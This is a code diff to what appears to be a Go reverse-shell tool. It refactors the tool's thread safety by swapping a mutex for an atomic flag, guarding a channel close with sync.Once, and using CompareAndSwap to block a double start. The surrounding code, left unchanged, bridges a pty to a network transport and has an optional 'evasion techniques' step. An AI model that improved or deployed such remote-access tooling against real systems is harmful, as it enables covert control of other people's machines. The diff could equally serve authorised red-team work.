@@ -8,6 +8,7 @@ import (
 	"os/exec"
 	"runtime"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/creack/pty"
@@ -62,10 +63,10 @@ func DefaultConfig() *Config {
 type Shell struct {
 	config    *Config
 	transport transport.Transport
-	mu        sync.RWMutex
-	running   bool
+	running   atomic.Bool
 	stopCh    chan struct{}
 	doneCh    chan struct{}
+	doneOnce  sync.Once
 }
 
 // New creates a new Shell with the given transport and config.
@@ -88,7 +89,7 @@ func (s *Shell) Start(ctx context.Context) error {
 		return fmt.Errorf("shell already running")
 	}
 	defer s.setRunning(false)
-	defer close(s.doneCh)
+	defer s.doneOnce.Do(func() { close(s.doneCh) })
 
 	// Apply evasion techniques if configured.
 	if s.config.Evasion != nil {
@@ -211,10 +212,7 @@ func (s *Shell) copyBidirectional(ptmx *os.File, cmd *exec.Cmd) error {
 
 // Stop gracefully stops the reverse shell.
 func (s *Shell) Stop() error {
-	s.mu.Lock()
-	defer s.mu.Unlock()
-
-	if !s.running {
+	if !s.running.Load() {
 		return fmt.Errorf("shell not running")
 	}
 
@@ -229,21 +227,17 @@ func (s *Shell) Wait() {
 
 // IsRunning returns true if the shell is currently running.
 func (s *Shell) IsRunning() bool {
-	s.mu.RLock()
-	defer s.mu.RUnlock()
-	return s.running
+	return s.running.Load()
 }
 
 // setRunning sets the running state in a thread-safe manner.
 func (s *Shell) setRunning(state bool) bool {
-	s.mu.Lock()
-	defer s.mu.Unlock()
-
-	if state && s.running {
-		return false
+	if state {
+		// CompareAndSwap returns true only if swapped from false to true,
+		// preventing double-start.
+		return s.running.CompareAndSwap(false, true)
 	}
-
-	s.running = state
+	s.running.Store(false)
 	return true
 }
 
